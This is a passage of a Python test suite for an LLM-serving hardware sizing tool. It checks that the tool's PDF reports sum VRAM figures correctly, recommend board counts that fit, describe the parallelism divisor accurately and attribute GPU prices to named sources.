# and left a 263 GiB gap with no caption on a 12-device 70B. Pinned on the
# rendered cells rather than the arithmetic behind them, which is a tautology.
# The tolerance is the formatter's own: fmt_gb rounds to the integer above 100,
# one decimal above 10 and two below, so each cell carries at most half of its
# last digit.
print("\nThe VRAM breakdown row adds up to the total printed beside it")


def check_vram_breakdown_row_sums():
    import re

    def grain(v):
        return 0.5 if v >= 100 else 0.05 if v >= 10 else 0.005

    with_copies = single_copy = 0
    for preset, boards, card in (("llama31-70b", 12, dict(DUAL, devices=1, gb=80, name="S")),
                                 ("llama31-70b", 1, dict(DUAL, devices=1, gb=80, name="S")),
                                 ("llama31-70b", 4, DUAL),
                                 ("llama31-70b", 64, dict(DUAL, devices=1, gb=80, name="S")),
                                 ("dsv3-671b", 16, dict(DUAL, devices=1, gb=80, name="S")),
                                 ("qwen3-30b", 12, dict(DUAL, devices=1, gb=80, name="S"))):
        cfg = dict(gr.arch_fields(gr.PRESETS[preset]), bpp=2, ctx=8192, conc=16,
                   n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
                   perfKey=card["perfKey"], hf_model="m", model_name="M")
        comp = gr.compute(dict(cfg))
        blob = report_text(card, boards, preset=preset, bpp=2)
        # A metric cell is one Paragraph carrying its own label and value:
        #   <font ...>Weights (3 copies)</font><br/><font ...><b>391 GiB</b></font>
        # Parsed as pairs so this reads the cells the reader sees, not the
        # arithmetic behind them, which would be a tautology.
        cells = dict(re.findall(
            r"<font[^>]*>([^<]+)</font><br/><font[^>]*><b>([^<]+)</b></font>", "\n".join(blob)))
        label = "Weights" if comp["model_copies"] <= 1 else f"Weights ({comp['model_copies']:g} copies)"
        total_label = "Total" if comp["model_copies"] <= 1 else "Total (cluster)"
        assert label in cells, f"{preset} at {boards}: no {label!r} cell in the report: {sorted(cells)}"
        if comp["model_copies"] > 1:
            with_copies += 1
        else:
            single_copy += 1
        vals = []
        for want in (label, "KV cache", "Act + OH", total_label):
            assert want in cells, f"{preset} at {boards}: no {want!r} cell: {sorted(cells)}"
            vals.append(float(re.sub(r"[^0-9.]", "", cells[want])))
        tol = sum(grain(v) for v in vals)
        assert abs(vals[0] + vals[1] + vals[2] - vals[3]) <= tol, (
            f"{preset} at {boards} boards ({comp['model_copies']:g} copies): "
            f"{vals[0]} + {vals[1]} + {vals[2]} = {sum(vals[:3])}, but the row prints {vals[3]}")
    assert with_copies and single_copy, (
        f"only reached one regime: {with_copies} replicated, {single_copy} single-copy")

test("the report's VRAM breakdown row sums to its own total",
     check_vram_breakdown_row_sums)


# ---- the board count page 1 recommends -----------------------------------
# It used to be ceil(total_gb / (0.9 * device_gb)): a cluster total divided by
# one device's capacity, which is circular because buying boards changes the
# split. It did not merely round badly, it diverged — 70B AWQ over nine RTX
# 4090s printed "Need 15+ boards" and re-asking at fifteen printed 25, then 42;
# 123B bf16 over T4s printed a number where no board count ever fits. So the
# property is stated as something a reader can act on, without reference to any
# formula: whatever number the report prints, recomputing the configuration at
# that number must fit, and where nothing fits it must say so instead.
print("\nThe board count the report recommends is one this engine agrees with")


def check_recommended_board_count_actually_fits():
    import re
    recommended = impossible = 0
    for preset, bpp, card, boards in (("llama31-70b", 0.5, dict(DUAL, devices=1, gb=24, name="S"), 9),
                                      ("mistral-lg-123b", 2, dict(DUAL, devices=1, gb=16, name="S"), 24),
                                      ("llama31-70b", 2, dict(DUAL, devices=1, gb=80, name="S"), 1),
                                      ("llama31-70b", 2, DUAL, 1),
                                      ("dsv3-671b", 1, DUAL, 2)):
        cfg = dict(gr.arch_fields(gr.PRESETS[preset]), ctx=8192, conc=16, n_gpu=boards,
                   gpu=card, nvlink=True, kv_bpp=2, bpp=bpp, vendor=card["vendor"],
                   perfKey=card["perfKey"], hf_model="m", model_name="M")
        comp = gr.compute(dict(cfg))
        if comp["fits"]:
            continue
        blob = "\n".join(report_text(card, boards, preset=preset, bpp=bpp))
        named = re.search(r"Smallest fit: (\d+) boards", blob)
        want, capped = gr.boards_needed(cfg, comp)
        if want is None:
            impossible += 1
            assert not named, f"nothing fits, but the report still names {named.group(1)} boards"
            assert not re.search(r"\d+\+ boards", blob), (
                "nothing fits, but the report claims a count and everything above it")
            assert "No number of these boards fits" in blob, (
                f"the report must say plainly that nothing fits:\n{blob[:400]}")
            assert capped is False, "a capped search must not be reported as impossible"
            continue
        recommended += 1
        assert named and int(named.group(1)) == want, (
            f"{preset}: report names {named and named.group(1)} boards, the search says {want}")
        # The claim: recompute the whole configuration there and ask the engine.
        at = gr.compute(dict(cfg, n_gpu=want))
        assert at["fits"], (
            f"{preset}: the report recommends {want} boards, which recomputes to "
            f"{at['per_total']} GiB per device against {at['device_gb']} "
            f"(TP={at['tp']} x DP={at['dp']})")
        # Smallest, not merely sufficient.
        for n in range(1, want):
            assert not gr.compute(dict(cfg, n_gpu=n))["fits"], (
                f"{preset}: {want} boards recommended but {n} already fits")
    assert recommended and impossible, (
        f"did not reach both outcomes: {recommended} recommended, {impossible} impossible")

test("recomputing at the recommended board count fits, or the report says none does",
     check_recommended_board_count_actually_fits)


# ---- the prose about the divisor, against the divisor ---------------------
# A number going wrong is caught by the pins in parity.test.py. A *sentence*
# going wrong is not: "Per-device VRAM above assumes weights sharded across all
# 12 devices" was a statement about the arithmetic, and the commit that started
# dividing by tp turned it false while every numeric assertion in this suite
# still passed. That is why this exists and why it went red on that commit
# rather than after it. This is the report README.md calls procurement-ready,
# and a document that misdescribes its own divisor is a worse failure than one
# that prints a wrong number, because the wrong number at least looks like one.
print("\nEvery sentence about the divisor states the divisor that was used")


def check_divisor_prose_matches_the_arithmetic():
    import re
    # Four kinds of claim, and conflating them hides exactly what the sentences
    # exist to disclose:
    #   divisor      what the per-device weights figure was divided by — tp for
    #                a dense model, the device count for an MoE.
    #   tp           what the emitted command shards by.
    #   dp           how many copies of the model the cluster holds.
    #   device_count what the KV cache was divided by, which is every device
    #                whatever the model does, because DP partitions requests.
    claims = [
        ("dense divisor claim",
         re.compile(r"weights and activations above are divided by (\d+), the sharding"), "tp"),
        ("dense KV claim",
         re.compile(r"KV cache is divided by all (\d+) devices"), "device_count"),
        ("dense replica claim",
         re.compile(r"full copy of the model in each of the (\d+) data-parallel"), "dp"),
        ("moe divisor claim",
         re.compile(r"Per-device weights above is divided by all (\d+) devices"), "divisor"),
        ("moe aside on attention", re.compile(r"shard only (\d+) ways"), "tp"),
        ("moe aside on the dense rule",
         re.compile(r"Dense models in this report divide by (\d+)"), "tp"),
        ("split claim", re.compile(r"TP=(\d+) x DP=(\d+) is a starting point"), ("tp", "dp")),
    ]
    seen = {name: 0 for name, _, _ in claims}
    for card, counts in ((dict(DUAL, devices=1, gb=80, name="S"),
                          (10, 12, 16, 20, 24, 40, 100, 128)),
                         # Boards that are two devices each: the sentence counts
                         # devices, and a board count that happened to be the
                         # divisor would hide the difference.
                         (DUAL, (5, 6, 8, 12))):
        for boards in counts:
            # Both regimes. A dense-only sweep leaves every MoE sentence unread,
            # and the MoE sentences are the ones describing a divisor this
            # engine deliberately did not correct.
            for active in (100, 5):
                cfg, text = report_strings(card, boards, bpp=0.5, active=active)
                comp = gr.compute(cfg)
                # Read back out of the result rather than assumed to be the
                # device count or tp: if the engine changes what it divides by,
                # this moves with it, and the test keeps comparing the prose
                # against the arithmetic instead of against an assumption of
                # its own.
                divisor = comp["weights_gb"] / comp["per_w"]
                targets = {"divisor": divisor, "tp": comp["tp"], "dp": comp["dp"],
                           "device_count": comp["device_count"]}
                blob = "\n".join(text)
                for name, rx, against in claims:
                    names = against if isinstance(against, tuple) else (against,)
                    for m in rx.finditer(blob):
                        seen[name] += 1
                        for claimed, key in zip(m.groups(), names):
                            want = targets[key]
                            assert abs(int(claimed) - want) <= abs(want) * 1e-9, (
                                f"{boards} boards x {card['devices']} devices, "
                                f"{'MoE' if comp['is_moe'] else 'dense'} "
                                f"(TP={comp['tp']} x DP={comp['dp']}): the {name} says "
                                f"{claimed}, but {key} is {want} — {m.group(0)!r}")
    # A regex that matches nothing asserts nothing, and rewording the note is
    # exactly how this test would stop looking with no one the wiser.
    silent = [n for n, k in seen.items() if not k]
    assert not silent, f"never found in any generated report: {silent}"

test("the note's divisor is the divisor the per-device figure was computed with",
     check_divisor_prose_matches_the_arithmetic)


# ---- tp/dp in a config are inert, and that is load-bearing ----------------
print("\ntp and dp in a JSON config are carried through and ignored")


def check_tp_dp_json_keys_are_inert():
    """compute() derives the split and reads nothing from cfg.

    from_json() copies through every key it does not recognise — the
    default-allow property this file pins elsewhere — and neither REQUEST_KEYS
    nor ARCH_TYPES mentions tp or dp, so validate_arch() never sees them. An
    earlier version of the split refactor read them here, and two previously
    inert keys became live and unvalidated: {"n_gpu": 1, "dp": 3} emitted
    --data-parallel-size 3 beside a "Single device" row, and {"tp": "4"} raised
    a TypeError out of `tp * dp`. Nothing but a comment defends that today, and
    a comment is not a test — the next person reasoning about where a TP/DP
    control would plug in will find exactly the same seam.
    """
    base = {"preset": "llama31-8b", "gpu": "h100-80", "n_gpu": 12,
            "bpp": 1, "ctx": 8192, "conc": 8}
    # The other from_json branch: no preset, cfg built straight from the user's
    # own keys, which is where an unknown key is copied through most directly.
    raw = {"params": 8, "layers": 32, "kv_heads": 8, "h_dim": 128, "gpu": "h100-80",
           "n_gpu": 9, "bpp": 1, "ctx": 8192, "conc": 8, "hf_model": "acme/raw-8b"}
    poisons = [{"tp": 1}, {"dp": 1}, {"tp": 16, "dp": 4}, {"tp": "4"},
               {"tp": 2.0}, {"tp": 0}, {"dp": -1}, {"tp": None}]
    for branch, spec in (("preset", base), ("raw", raw)):
        path = write_json(spec)
        try:
            clean_cfg = gr.from_json(path)
            clean = gr.compute(clean_cfg)
            clean_cmd = gr.build_vllm_cmd(clean_cfg, clean)
        finally:
            os.unlink(path)
        for poison in poisons:
            path = write_json(dict(spec, **poison))
            try:
                cfg = gr.from_json(path)
            finally:
                os.unlink(path)
            # The keys must actually arrive and be ignored. If from_json ever
            # started filtering them out this would pass for the wrong reason,
            # and the seam it is guarding would be open again the moment the
            # filter moved.
            missing = [k for k in poison if k not in cfg]
            assert not missing, (
                f"{branch} branch: {missing} never reached cfg, so this proves nothing "
                "about compute() ignoring them")
            got = gr.compute(cfg)
            drift = [f"{k}: {clean.get(k)!r} -> {got.get(k)!r}"
                     for k in set(clean) | set(got) if clean.get(k) != got.get(k)]
            assert not drift, (
                f"{branch} branch: {poison} changed compute()'s answer — "
                + "; ".join(drift[:4]))
            cmd = gr.build_vllm_cmd(cfg, got)
            assert cmd == clean_cmd, (
                f"{branch} branch: {poison} changed the emitted command:\n{cmd}")

def check_fp8_note_rides_the_pdf():
    """The PDF is the surface that gets forwarded to someone who did not pick
    the hardware, and its FP8 note had no coverage at all — deleting it was
    fully green, assets included. Two-sided: the note must be absent on silicon
    that does have FP8 tensor cores, or it is noise on the common case."""
    NOTE = "no FP8 tensor cores"
    for slug, has_fp8 in (("a100-80", False), ("t4-16", False),
                          ("h100-80", True), ("b200-192", True)):
        card = dict(gr.GPUS[slug])
        # bpp=1 with the quant string, the way the UI emits FP8.
        cfg, text = report_strings(card, 1, bpp=1, quant="fp8")
        blob = "\n".join(text)
        comp = gr.compute(cfg)
        assert comp["fp8_no_tensor_cores"] is (not has_fp8), (
            f"{slug}: caps.fp8 is {has_fp8} but compute() says "
            f"fp8_no_tensor_cores={comp['fp8_no_tensor_cores']}")
        if has_fp8:
            assert NOTE not in blob, (
                f"{slug} has FP8 tensor cores, but the report says it does not")
        else:
            assert NOTE in blob, (
                f"{slug} has no FP8 tensor cores and the report never says so. "
                f"The compute ceiling and TTFT it prints are the FP16 ones.")
            # And the note must name the card, not gesture at it — a reader of a
            # forwarded PDF did not choose the hardware and may not know which it is.
            assert card["name"].replace(" GB", "GB") in blob or card["name"] in blob, (
                f"{slug}: the FP8 note does not name the card it is about")

test("the PDF says when FP8 was asked for on silicon that cannot run it",
     check_fp8_note_rides_the_pdf)


test("tp and dp in a JSON config reach cfg and change nothing",
     check_tp_dp_json_keys_are_inert)


# ---- cost provenance: a named source, or "not recorded" said plainly --------
print("\nCost provenance: a named source, or \"not recorded\" said plainly, never a guess")

OLD_COMPOSITES = ("AWS/GCP/Azure", "Lambda/CoreWeave", "Vast.ai)",
                  "AWS, GCP, Azure on-demand", "Lambda, CoreWeave, RunPod", "Vast.ai, spot instances")
PROVIDER_NAMES_LIST = ("Azure", "AWS", "Lambda", "CoreWeave", "Vast.ai")
# General, not exact: two or more provider-ish names joined by a comma or
# slash, wherever they occur — mirrors tests/model.test.js's MULTI_PROVIDER,
# added after a cold-check sabotage appended " (AWS, GCP, Azure)" after an
# otherwise-correct JS label and none of the three exact phrases above
# matched a shorter list in a different shape. A real sourced label never
# joins two provider names this way.
MULTI_PROVIDER = re.compile(
    r"\b(?:AWS|GCP|Azure|Lambda|CoreWeave|RunPod|Vast\.ai)(?:\s*[,/]\s*"
    r"(?:AWS|GCP|Azure|Lambda|CoreWeave|RunPod|Vast\.ai)){1,}")


def check_price_source_label_format_is_a_fixed_expectation():
    """The discovery sweeps below compute their own "expected" string by
    calling gr.price_source_label(), which proves the PDF agrees with that
    function but cannot catch a bug inside the function itself — a version
    that quietly dropped the date would still match its own output. This is
    the check that cannot pass that way: every expected string is a literal,
    typed once, independent of the function under test."""
    gpu = {"priceSource": {"hyper": {"provider": "azure", "sku": "Standard_ND96isr_H100_v5",
                                      "region": "eastus", "date": "2026-09-16"}}}
    assert gr.price_source_label(gpu, "hyper") == (
        "Azure · Standard_ND96isr_H100_v5 · eastus · read 2026-09-16")

    for provider_id, name in (("azure", "Azure"), ("aws", "AWS"), ("lambda", "Lambda"),
                              ("coreweave", "CoreWeave"), ("vast", "Vast.ai")):
        g = {"priceSource": {"spot": {"provider": provider_id, "sku": "X",
                                       "region": "global", "date": "2026-01-01"}}}
        assert gr.price_source_label(g, "spot") == f"{name} · X · global · read 2026-01-01", (
            f"provider id {provider_id!r} did not render as {name!r}")

    # An unrecognised provider id falls back to itself instead of raising or
    # silently dropping the field.
    unknown = {"priceSource": {"spec": {"provider": "newvendor", "sku": "Y", "region": "r", "date": "d"}}}
    assert gr.price_source_label(unknown, "spec") == "newvendor · Y · r · read d"

    assert gr.price_source_label({}, "hyper") == "not recorded"
    assert gr.price_source_label({"priceSource": {}}, "hyper") == "not recorded"
    leaky = {"priceSource": {"spec": {"provider": "x", "sku": "y", "region": "z", "date": "d"}}}
    assert gr.price_source_label(leaky, "hyper") == "not recorded", (
        "a sourced spec tier must not leak into a hyper lookup")

    # A price read by hand off the provider's page: named and dated, and saying so.
    hand = {"provider": "RunPod", "sku": "MI300X (Secure Cloud)", "region": "global",
            "date": "2026-09-23", "price": 2.39, "url": "https://www.runpod.io/gpu-models/mi300x"}
    assert gr.price_source_label({"spec": 2.39, "priceRecord": {"spec": hand}}, "spec") == (
        "RunPod · MI300X (Secure Cloud) · global · recorded by hand 2026-09-23, not re-checked weekly")
    assert gr.price_source_label({"spec": 2.39, "priceRecord": {"spot": hand}}, "spec") == "not recorded", (
        "a hand record on another tier leaked into this one")
    assert gr.price_source_label(dict(gpu, priceRecord={"hyper": hand}), "hyper") == (
        "Azure · Standard_ND96isr_H100_v5 · eastus · read 2026-09-16"), "a hand record displaced a reading"
    assert gr.price_source_label({"spot": None, "priceRecord": {"spot": hand}}, "spot") == (
        "no confirmed hourly price"), "a null tier rendered the hand record attached to it"

test("price_source_label formats provider, SKU, region and date — a fixed expectation",
     check_price_source_label_format_is_a_fixed_expectation)


NOTES_PRICE_SENTENCE = (
    "GPU prices are mid-2026 per-board/hr figures across 3 tiers: hyperscaler, "
    "specialized, spot/marketplace — see each tier's own source above, or "
    '"not recorded" where it has no confirmed source.')


def check_pdf_cost_section_names_a_source_or_says_not_recorded():
    """Mirrors tests/model.test.js's discovery sweep for the same requirement,
    on the engine that has no DOM to discover renderers from: report_strings()
    already walks the whole reportlab story (every Paragraph, table cell and
    bullet — see story_strings()'s docstring), so "every string the PDF
    would show" is the discovery here, the same way "every element the page
    renders" is the discovery on the JS side. price_source_label() is called
    directly rather than re-extracted from source, since this file already
    imports generate_report as a real module."""
    sourced = {"provider": "lambda", "sku": "TEST PLAN", "region": "global", "date": "2026-09-22"}
    cases = [
        ("mixed (real h100-80)", dict(gr.GPUS["h100-80"]), "mixed"),
        ("none recorded (real rtx5090-32)", dict(gr.GPUS["rtx5090-32"]), "none"),
        ("all sourced (synthetic)",
         dict(gr.GPUS["h100-80"], priceSource={"hyper": sourced, "spec": sourced, "spot": sourced}), "all"),
        # h100-80's unsourced spot tier, recorded by hand: the Source line must
        # carry that label for that tier, exactly as price_source_label() renders it.
        ("hand-recorded spot (synthetic)",
         dict(gr.GPUS["h100-80"], priceRecord={"spot": {
             "provider": "RunPod", "sku": "MI300X (Secure Cloud)", "region": "global",
             "date": "2026-09-23", "price": 2.39, "url": "https://www.runpod.io/gpu-models/mi300x"}}), "mixed"),
    ]
    # A dollar figure, or the dedicated provenance line: reportlab's cost
    # table is plain strings per cell, so the tier's price ("$12.30") and its
    # source ("Source — Hyperscaler: Azure · ... ") are necessarily two
    # different list elements, unlike the HTML page where a source sub-label
    # sits inside the very same cell as its price. Both shapes are content
    # discovered from the story, not an element position picked by hand.
    cost_line = re.compile(r"\$[\d,]+\.\d{2}|^Source —")
    mixed_sourced_hit = mixed_not_recorded_hit = 0
    for label, card, shape in cases:
        cfg, strings = report_strings(card, 1, bpp=2)
        cost_strings = [s for s in strings if cost_line.search(s)]
        assert cost_strings, f"{label}: no cost figure printed at all — report_strings found nothing"

        # Cold-check finding: generate_report.py used to carry a second
        # composite provider list, in "Notes and assumptions" ("hyperscaler
        # (AWS/GCP/Azure)" etc.) rather than the cost table itself — a T4
        # PDF said "Specialized: not recorded" in the cost section and then
        # named three specialized providers a page later. An earlier version
        # of this test scoped its composite check to cost_strings only and
        # excused that line as "a category description", which is wrong: the
        # requirement is no composite provider list anywhere near a price,
        # full stop, so this checks every string the report prints, not only
        # the ones with a dollar figure on them. Same for calling a sourced
        # price an "estimate" — a dated, attributed figure is not a guess.
        whole_blob = "\n".join(strings)
        for composite in OLD_COMPOSITES:
            assert composite not in whole_blob, (
                f"{label}: the composite provider list ({composite!r}) appears somewhere in the "
                f"PDF, even outside the cost table")
        m = MULTI_PROVIDER.search(whole_blob)
        assert not m, f"{label}: two or more providers named together ({m.group(0)!r}) somewhere in the PDF"
        # The notes carry no cost figure, so cost_strings never sees them, and a
        # sentence there is as much a claim about where a price came from as a
        # cost row is. Round 2 added "Spot prices are from Vast.ai." to the
        # notes of every card, including one with nothing recorded, and brought
        # the composite back inside that sentence in shapes the composite
        # regexes do not match (" and " joined, lowercase). One sentence in the
        # notes mentions price and what it may say is a contract, so it is a
        # literal.
        for sentence in re.split(r"(?<=\.)\s+", whole_blob):
            if re.search(r"\bprices?\b", sentence, re.I) and "$" not in sentence:
                assert sentence.strip().lstrip("\u2022 ").startswith(NOTES_PRICE_SENTENCE), (
                    f"{label}: the PDF says something about price outside the cost table that is "
                    f"not the one sentence it may say — {sentence.strip()[:200]!r}")
        assert "per-board/hr estimates" not in whole_blob, (
            f"{label}: still calls GPU prices \"estimates\" — some tiers are sourced, dated, "
            f"attributed figures, not guesses")

        for s in cost_strings:
            for composite in OLD_COMPOSITES:
                assert composite not in s, (
                    f"{label}: a cost figure's own string still names the old composite "
                    f"provider list ({composite!r}): {s!r}")
            assert not re.search(r"\bNone\b|\bnan\b", s), (
                f"{label}: prints a raw None/nan instead of a source or \"not recorded\": {s!r}")

        blob = "\n".join(cost_strings)
        # Checked per tier, not pooled. A pooled "did any tier's expected
        # string show up anywhere" check is satisfied by ONE correct tier
        # while a different tier on the same card is broken — h100-80's
        # Source line renders all three tiers in one string ("Source —
        # Hyperscaler: ... Specialized: ... Spot: ..."), so a cold-check
        # sabotage that stripped only hyper's date left spec's label intact,
        # the pooled count still went positive, and this test stayed green.
        # Every tier's own expected value must appear, individually.
        # Round-2 cold check: `expected in blob` is membership, so swapping
        # hyper's and spec's labels between tiers left both present and this
        # passed — Lambda's SKU printed under the Azure price. Each tier's
        # label must sit after that tier's OWN name, so the text is cut at the
        # next tier name and the label looked for only in its own segment.
        TIER_NAME = {"hyper": "Hyperscaler:", "spec": "Specialized:", "spot": "Spot:"}
        marks = sorted((blob.index(n), t, len(n)) for t, n in TIER_NAME.items() if n in blob)
        segments = {t: blob[at + ln:(marks[i + 1][0] if i + 1 < len(marks) else len(blob))]
                    for i, (at, t, ln) in enumerate(marks)}
        for tier in ("hyper", "spec", "spot"):
            expected = gr.price_source_label(card, tier)
            where = segments.get(tier, blob)
            assert expected in where, (
                f"{label}/{tier}: expected {expected!r} not found after this tier's own name: "
                f"{where[:300]!r}")
            if expected == "not recorded":
                mixed_not_recorded_hit += 1
            else:
                mixed_sourced_hit += 1
        if shape == "none":
            for p in PROVIDER_NAMES_LIST:
                assert p not in blob, f"{label}: names provider {p!r} with nothing recorded to back it"
    assert mixed_sourced_hit > 0 and mixed_not_recorded_hit > 0, (
        f"the sweep did not exercise both states across every case: "
        f"sourced={mixed_sourced_hit} not-recorded={mixed_not_recorded_hit}")

# One clock per case, scrubbed by shape; two bare dates per case, scrubbed by
# value. Both counts are a contract — see the test below for what a change in
# either one means.
CLOCKS_PER_CASE = 1
BARE_DATES_PER_CASE = 2


def check_the_clock_scrubs_fire_exactly_as_often_as_there_are_clocks():
    """Round-2 cold check: two ways to plant a suite that goes red tomorrow
    with no code change, both invisible on the day they land.

    `golden_clocks()` replaces the footer's generated-at line by its shape, and
    any string that is EXACTLY today's date by value. Raise the second count —
    render a priceSource read date as its own paragraph and it becomes
    "[today]" too — and the golden records a placeholder where a fixed content
    date belongs; tomorrow that string is a date again and the golden no longer
    matches. Lower the first — draw the footer as "Date: " + today and the
    shape scrub never fires — and the golden records a literal date that stops
    being today at midnight.

    Round 1 was the same failure in its first shape, and it reached master's
    CI. Neither version shows up on the day it is written, so counting is the
    only thing that catches them while someone is still looking."""
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "golden", "report.json")
    with open(path) as f:
        golden = json.load(f)
    assert golden, "the report golden is empty"
    bad = []
    for case, recorded in golden.items():
        blob = json.dumps(recorded)
        clocks = blob.count("Generated [date] at [time]")
        bare = blob.count("[today]")
        if clocks != CLOCKS_PER_CASE or bare != BARE_DATES_PER_CASE:
            bad.append(f"{case}: {clocks} clock placeholder(s) (want {CLOCKS_PER_CASE}), "
                       f"{bare} bare-date placeholder(s) (want {BARE_DATES_PER_CASE})")
    assert not bad, (
        "the clock scrubs no longer fire once per clock:\n       " + "\n       ".join(bad)
        + "\n       More bare dates means a content date is being scrubbed as if it were a "
          "clock, and the golden will stop matching tomorrow. Fewer means a clock is being "
          "recorded literally, and the golden will stop matching tomorrow.")

test("the clock scrubs fire exactly as often as the report has clocks",
     check_the_clock_scrubs_fire_exactly_as_often_as_there_are_clocks)


test("the PDF cost section names a source or says \"not recorded\", for every shape",
     check_pdf_cost_section_names_a_source_or_says_not_recorded)


def check_pdf_tier_names_are_bare():
    """The old defect in its most literal form: the tier name column itself
    used to carry the composite list — the cell's whole string used to BE
    "Hyperscaler (AWS/GCP/Azure)". report_strings() surfaces each table cell
    as its own list element (see story_strings()'s _cellvalues walk), so
    membership is exact-match by construction: if the parenthetical were
    still there, the bare name below would not be a member of strings at
    all, it would be missing, which is what a regression here looks like."""
    cfg, strings = report_strings(dict(gr.GPUS["h100-80"]), 1, bpp=2)
    assert "Hyperscaler" in strings, "the PDF cost table lost its Hyperscaler tier name"
    assert "Specialized" in strings, "the PDF cost table lost its Specialized tier name"
    assert "Spot / marketplace" in strings, "the PDF cost table lost its Spot / marketplace tier name"

test("the PDF cost table's tier names carry no provider parenthetical",
     check_pdf_tier_names_are_bare)


MENU_PRICE_RE = re.compile(r"\$[\d.]+(\*?)-\$[\d.]+(\*?)/hr")


def check_interactive_gpu_menu_marks_sourced_prices():
    """Cold-check finding (minor): the interactive CLI's GPU menu named
    neither state, for either price shown, unlike every other surface. A
    full "Provider · SKU · region · read date" per row does not fit a
    numbered list of a dozen cards, so this checks the compact marker
    instead: every GPU with a recorded spot/hyper source gets a '*' on that
    specific price, every GPU without does not — checked separately per
    price, and read off the real catalog rather than a hand-picked pair,
    so an unusual future catalog (sourced spot but not hyper, say) is
    still checked correctly instead of by a rule that happens to work for
    today's rows alone."""
    # interactive_mode() asks more questions than this test cares about
    # (preset, precision, KV cache, ...); only the GPU menu it prints before
    # the first answer is read matters here, and abandoning the script part
    # way through raises once input() runs dry — expected, not a failure.
    with unittest.mock.patch("builtins.input", side_effect=["1", "1"]), \
         contextlib.redirect_stdout(io.StringIO()) as out:
        try:
            gr.interactive_mode()
        except StopIteration:
            pass
    printed = out.getvalue()
    menu_lines = {}
    for line in printed.splitlines():
        m = re.match(r"^\s*(\d+)\.\s", line)
        if m:
            menu_lines[m.group(1)] = line
    checked = 0
    for i, (k, v) in enumerate(gr.GPUS.items()):
        line = menu_lines.get(str(i + 1))
        assert line and k in line, f"{k}: not found on its own numbered menu line: {line!r}"
        # Either kind of named, dated source earns the mark.
        ps = {**(v.get("priceRecord") or {}), **(v.get("priceSource") or {})}
        checked += 1
        if v["spot"] is None or v["hyper"] is None:
            # A card with a null end shows the tiers it does price, cheapest tier
            # first, each marked the same way, or the null wording — never "$None".
            priced = [(t, v[t]) for t in ("spot", "spec", "hyper") if v[t] is not None]
            want = ("-".join(f"${p}{'*' if t in ps else ''}" for t, p in priced) + "/hr"
                    if priced else "no confirmed hourly price")
            assert line.endswith(f", {want})"), f"{k}: menu line should end ', {want})': {line!r}"
            continue
        price_m = MENU_PRICE_RE.search(line)
        assert price_m, f"{k}: menu line does not carry a $spot-$hyper/hr figure: {line!r}"
        spot_starred, hyper_starred = bool(price_m.group(1)), bool(price_m.group(2))
        assert spot_starred == ("spot" in ps), (
            f"{k}: spot price starred={spot_starred}, but priceSource carries spot={('spot' in ps)}: {line!r}")
        assert hyper_starred == ("hyper" in ps), (
            f"{k}: hyper price starred={hyper_starred}, but priceSource carries hyper={('hyper' in ps)}: {line!r}")
    assert checked == len(gr.GPUS), f"only checked {checked} of {len(gr.GPUS)} catalog rows"

test("the interactive CLI's GPU menu marks a price with a recorded source, per price",
     check_interactive_gpu_menu_marks_sourced_prices)


# ---- hardware with no measured constants ------------------------------------
# The ruling: a card whose perfKey has no PERF entry gets its full VRAM breakdown,
# fit verdict, cost and command, and no throughput. Every figure that needs a
# constant is None and the report says why in their place. The fallback to
# nvidia is what this replaces. Each probe is a pair — the same cfg on a card
# with constants and on the same card without — so every assertion below is
# about the constants and nothing else.
print("\nHardware with no measured constants")

# Every field compute() returns that reads no PERF constant: the ruling, written
# down. Everything else it returns has to be None without constants, so a
# throughput figure added later that forgets to suppress fails the first test
# below, and so does a new VRAM figure, until someone decides its side.
SURVIVE_WITHOUT_CONSTANTS = {
    # VRAM, capacity and the fit they decide
    "weights_gb", "kv_gb", "act_gb", "total_oh", "total_gb", "per_w", "per_kv", "per_a",
    "per_oh", "per_total", "total_vram", "free_kv", "kv_per_tok_gb", "kv_bytes_per_tok",
    "max_ctx_1", "max_conc_8k", "max_conc_4k", "kv_saved_by_prefix_gb", "eff_prefix",
    "is_moe", "total_tokens", "device_count", "device_gb", "device_bw", "fits", "comfortable",
    # the parallelism split
    "tp", "dp", "shard_divisor", "model_copies",
    # batch sizes, which are KV arithmetic
    "eff_batch", "max_batch_kv", "batch_limited", "sat_batch",
    # cost
    "hourly_hyper", "hourly_spec", "hourly_spot",
    # a fact about the card and the precision rather than a constant
    "fp8_no_tensor_cores",
}
# The fields the ruling names, so the set above cannot absorb one of them.
NAMED_SUPPRESSED = {"single_tok", "agg_tok", "sat_tok", "per_user_load", "agg_obs_lo",
                    "agg_obs_hi", "ttft_ms", "ttft_cold_ms", "ttft_warm_ms", "compute_ratio",
                    "perf_mbu", "perf_mfu_decode", "perf_mfu_prefill", "perf_obs_lo",
                    "perf_obs_hi", "perf_fp8_ratio"}


# Every row in the catalog is a single-device board, and the AMD rows to come
# mostly will be, so a grid built on the dual-GCD fixture alone would never
# render the shape the tool actually ships. generate() could print an estimate,
# or withhold a row, on `devices == 1` — or on the KV dtype, or on an attention
# mode, or on a preset having named the model — and nothing here would look. So
# the grid runs real catalog rows beside the fixture and rotates what the
# document can branch on.
PROBE_CARDS = [
    ("H100 80GB (FP8 cores)", gr.GPUS["h100-80"]),
    ("A100 80GB (no FP8 cores)", gr.GPUS["a100-80"]),
    ("RTX 4090 (consumer, PCIe)", gr.GPUS["rtx4090-24"]),
    ("T4 16GB (no FP8 cores)", gr.GPUS["t4-16"]),
    ("B200 192GB", gr.GPUS["b200-192"]),
    ("dual-GCD board (2 devices)", DUAL),
    # Two cards whose vendor is not nvidia, under names no catalog row has, so a
    # report branching on the vendor — or on a name it has never seen — is probed
    # apart from the real rows below. Their perfKey is one PERF has, because a
    # probe is a pair and the constants are what the pair varies: fixing the key
    # isolates the vendor.
    ("MI355X 288GB (amd, oam, not in the catalog)",
     dict(gr.GPUS["b200-192"], name="MI355X 288 GB", vendor="amd", form="oam")),
    ("Radeon PRO W7900 (amd, workstation)",
     dict(gr.GPUS["rtx6000ada-48"], name="Radeon PRO W7900 48 GB", vendor="amd")),
] + [
    # And every real row whose vendor is not nvidia, derived from the catalog so
    # a row added later joins the grid: their real names, forms, device counts
    # and unpriced tiers, given a key PERF has for the side with constants.
    (f"{g['name']} (catalog, {g['vendor']}, {g['form']})", dict(g, perfKey="nvidia"))
    for g in gr.GPUS.values() if g["vendor"] != "nvidia"
]
PROBE_PRESETS = [("8B dense", "llama31-8b"), ("70B dense", "llama31-70b"),
